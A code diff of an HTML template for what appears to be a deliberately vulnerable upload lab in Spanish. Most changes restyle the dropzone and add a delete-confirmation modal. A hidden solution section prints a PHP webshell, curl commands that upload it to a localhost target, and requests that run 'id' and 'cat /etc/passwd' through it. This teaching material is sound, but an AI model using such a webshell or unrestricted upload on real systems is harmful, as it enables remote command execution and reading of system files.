@@ -5,21 +5,29 @@
   {% include '_lab_header.html' %}
 
   <div class="hl-card mb-4">
-    <form method="POST" action="/upload" enctype="multipart/form-data" class="space-y-4">
-      <div class="border-2 border-dashed border-gray-300 dark:border-gray-600 hover:border-primary dark:hover:border-primary rounded-xl p-8 text-center transition cursor-pointer">
-        <div class="text-gray-400 text-sm" data-i18n="upload_dropzone">Haz clic o arrastra archivos aquí</div>
-        <div class="text-xs text-gray-300 dark:text-gray-500 mt-1" data-i18n="upload_no_restrict">Sin restricciones de tipo de archivo</div>
-        <input type="file" id="file-input" name="file" multiple onchange="updateLabel(this)" style="margin-top:1em" />
-        <div id="file-label" class="mt-3 text-xs font-mono" style="color:var(--hl-primary)"></div>
-      </div>
-      <button type="submit" class="btn-primary w-full justify-center" data-i18n="upload_btn">Subir archivos</button>
+    <form id="upload-form" method="POST" action="/upload" enctype="multipart/form-data">
+      <label id="drop-zone" for="file-input"
+             style="display:block;border:2px dashed rgba(var(--hl-primary-rgb),.25);border-radius:.75rem;padding:2.5rem 1.5rem;text-align:center;cursor:pointer;transition:border-color .2s,background .2s">
+        <div style="pointer-events:none">
+          <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin:0 auto .875rem;opacity:.35;display:block">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+            <polyline points="17 8 12 3 7 8"/>
+            <line x1="12" y1="3" x2="12" y2="15"/>
+          </svg>
+          <p class="text-sm text-gray-500 dark:text-gray-400" data-i18n="upload_dropzone">Haz clic o arrastra archivos aquí</p>
+          <p class="text-xs text-gray-400 dark:text-gray-600 mt-1" data-i18n="upload_no_restrict">Sin restricciones de tipo de archivo</p>
+          <div id="file-label" class="mt-3 text-xs font-mono" style="color:var(--hl-primary);min-height:1.2em"></div>
+        </div>
+        <input type="file" id="file-input" name="file" multiple style="display:none">
+      </label>
+      <button type="submit" class="btn-primary w-full justify-center mt-3" data-i18n="upload_btn">Subir archivos</button>
     </form>
   </div>
 
   {% with messages = get_flashed_messages(with_categories=true) %}
     {% if messages %}
       {% for category, msg in messages %}
-        <div class="alert-{{ 'success' if category == 'success' else 'danger' }} mb-4 text-sm font-mono">{{ msg|striptags }}</div>
+        <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg|striptags }}</div>
       {% endfor %}
     {% endif %}
   {% endwith %}
@@ -41,13 +49,15 @@
         <span class="text-gray-700 dark:text-gray-300">{{ f }}</span>
         <div class="flex items-center gap-2">
           <a href="/uploads/{{ f }}" target="_blank" class="transition hover:opacity-70" style="color:var(--hl-primary)" data-i18n="upload_access">Acceder →</a>
-          <form method="POST" action="/uploads/delete/{{ f|urlencode }}" style="display:inline;margin:0;padding:0" onsubmit="return confirm('Eliminar {{ f }}?')">
-            <button type="submit" title="Eliminar archivo" aria-label="Eliminar archivo" style="background:none;border:none;cursor:pointer;padding:0;margin-left:8px;display:inline-flex;align-items:center;">
+          <form method="POST" action="/uploads/delete/{{ f|urlencode }}" style="display:inline;margin:0;padding:0"
+                onsubmit="return showDeleteConfirm(this, {{ f|tojson }})">
+            <button type="submit" title="Eliminar archivo" aria-label="Eliminar archivo"
+                    style="background:none;border:none;cursor:pointer;padding:0;margin-left:8px;display:inline-flex;align-items:center;">
               <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#e53e3e;vertical-align:middle;">
-                <polyline points="3 6 5 6 21 6" />
-                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2" />
-                <line x1="10" y1="11" x2="10" y2="17" />
-                <line x1="14" y1="11" x2="14" y2="17" />
+                <polyline points="3 6 5 6 21 6"/>
+                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2"/>
+                <line x1="10" y1="11" x2="10" y2="17"/>
+                <line x1="14" y1="11" x2="14" y2="17"/>
               </svg>
             </button>
           </form>
@@ -57,6 +67,44 @@
     </ul>
   </div>
   {% endif %}
+</div>
+
+<!-- Modal de confirmación de borrado -->
+<div id="delete-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/60" style="backdrop-filter:blur(4px)" onclick="cancelDeleteAction()"></div>
+  <div class="relative rounded-2xl p-6 max-w-xs w-full shadow-2xl"
+       style="background:var(--bg-card,#1a1a2e);border:1px solid rgba(255,255,255,.1)">
+    <div class="flex items-center gap-3 mb-4">
+      <div class="flex-shrink-0 flex items-center justify-center rounded-full"
+           style="width:2.5rem;height:2.5rem;background:rgba(239,68,68,.15)">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="3 6 5 6 21 6"/>
+          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2"/>
+          <line x1="10" y1="11" x2="10" y2="17"/>
+          <line x1="14" y1="11" x2="14" y2="17"/>
+        </svg>
+      </div>
+      <div>
+        <p class="font-bold text-sm text-gray-900 dark:text-white">Eliminar archivo</p>
+        <p class="text-xs text-gray-500 dark:text-gray-400 mt-0.5">Esta acción no se puede deshacer</p>
+      </div>
+    </div>
+    <p class="text-sm text-gray-600 dark:text-gray-300 mb-5">
+      ¿Eliminar <span id="confirm-filename" class="font-mono font-bold" style="color:var(--hl-primary)"></span>?
+    </p>
+    <div class="flex gap-2 justify-end">
+      <button onclick="cancelDeleteAction()" type="button"
+              class="text-sm px-4 py-1.5 rounded-lg transition"
+              style="border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);cursor:pointer;color:inherit">
+        Cancelar
+      </button>
+      <button onclick="confirmDeleteAction()" type="button"
+              class="text-sm px-4 py-1.5 rounded-lg font-semibold transition"
+              style="background:#ef4444;border:none;color:#fff;cursor:pointer">
+        Eliminar
+      </button>
+    </div>
+  </div>
 </div>
 
 <div id="resolution-data" class="hidden">
@@ -84,16 +132,14 @@
       </ol>
       <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
     # Guarda como shell.php y sube el archivo
-    # Accede a /uploads/shell.php?cmd=id para probar
-    # Si ves un error de constante indefinida, revisa que el archivo empiece con <b>&lt;?php</b> y no texto plano.</pre>
+    # Accede a /uploads/shell.php?cmd=id para probar</pre>
       <ol start="4">
         <li>Sube el archivo mediante el formulario o con curl:</li>
       </ol>
       <pre>curl -F "file=@shell.php" http://localhost:5000/upload
   curl -F "file=@shell.py" http://localhost:5000/upload</pre>
       <ol start="5">
-        <li>En easy/medium, la salida de ejecución aparecerá tras subir el archivo.<br>
-        Para webshell PHP, accede a <code>/uploads/shell.php?cmd=id</code> o el comando que desees.</li>
+        <li>Para webshell PHP, accede a <code>/uploads/shell.php?cmd=id</code> o el comando que desees.</li>
       </ol>
       <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
   curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
@@ -130,13 +176,68 @@ curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
 </div>
 
 <script>
-function updateLabel(input) {
-  const label = document.getElementById('file-label');
-  if (input.files && input.files.length > 0) {
-    label.textContent = Array.from(input.files).map(f => f.name).join(', ');
-  } else {
-    label.textContent = '';
+// ── Dropzone drag & drop ──
+(function() {
+  const zone  = document.getElementById('drop-zone');
+  const input = document.getElementById('file-input');
+  if (!zone || !input) return;
+
+  function highlight(on) {
+    zone.style.borderColor = on ? 'var(--hl-primary)' : 'rgba(var(--hl-primary-rgb),.25)';
+    zone.style.background  = on ? 'rgba(var(--hl-primary-rgb),.05)' : '';
   }
+
+  zone.addEventListener('mouseenter', () => highlight(true));
+  zone.addEventListener('mouseleave', () => highlight(false));
+  zone.addEventListener('dragover',   e => { e.preventDefault(); highlight(true); });
+  zone.addEventListener('dragleave',  e => { if (!zone.contains(e.relatedTarget)) highlight(false); });
+  zone.addEventListener('drop', e => {
+    e.preventDefault();
+    highlight(false);
+    const files = e.dataTransfer && e.dataTransfer.files;
+    if (!files || !files.length) return;
+    try {
+      const dt = new DataTransfer();
+      Array.from(files).forEach(f => dt.items.add(f));
+      input.files = dt.files;
+    } catch(_) {}
+    updateLabel(input);
+  });
+  input.addEventListener('change', () => updateLabel(input));
+})();
+
+// ── File label ──
+function updateLabel(input) {
+  const el = document.getElementById('file-label');
+  if (!el) return;
+  el.textContent = input.files && input.files.length
+    ? Array.from(input.files).map(f => f.name).join(', ')
+    : '';
+}
+
+// ── Delete modal ──
+var _pendingDeleteForm = null;
+
+function showDeleteConfirm(form, filename) {
+  _pendingDeleteForm = form;
+  var el = document.getElementById('confirm-filename');
+  if (el) el.textContent = filename;
+  var modal = document.getElementById('delete-modal');
+  if (modal) modal.classList.remove('hidden');
+  return false;
+}
+
+function confirmDeleteAction() {
+  var modal = document.getElementById('delete-modal');
+  if (modal) modal.classList.add('hidden');
+  if (_pendingDeleteForm) { _pendingDeleteForm.submit(); }
+  _pendingDeleteForm = null;
+}
+
+function cancelDeleteAction() {
+  var modal = document.getElementById('delete-modal');
+  if (modal) modal.classList.add('hidden');
+  _pendingDeleteForm = null;
 }
 </script>
 {% endblock %}
